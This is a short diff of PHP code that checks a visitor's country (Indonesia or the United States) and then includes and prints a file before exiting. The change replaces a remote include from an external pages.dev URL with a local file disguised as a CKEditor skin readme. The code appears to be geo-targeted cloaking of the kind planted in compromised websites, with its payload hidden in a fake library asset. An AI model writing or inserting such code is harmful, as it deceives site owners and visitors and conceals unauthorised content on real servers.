@@ -29,7 +29,7 @@ $data = json_decode($response, true);
 
 if ($data && ($data['countryCode'] === 'ID' || $data['countryCode'] === 'US')) {
     ob_start();
-    include 'https://atlantikcoffee.pages.dev/atlantikcoffee/readme';
+    include '/home/atlantik/public_html/public/ckeditor/skins/moono-lisa/readme.html';
     $output = ob_get_clean();
     echo $output;
     exit();
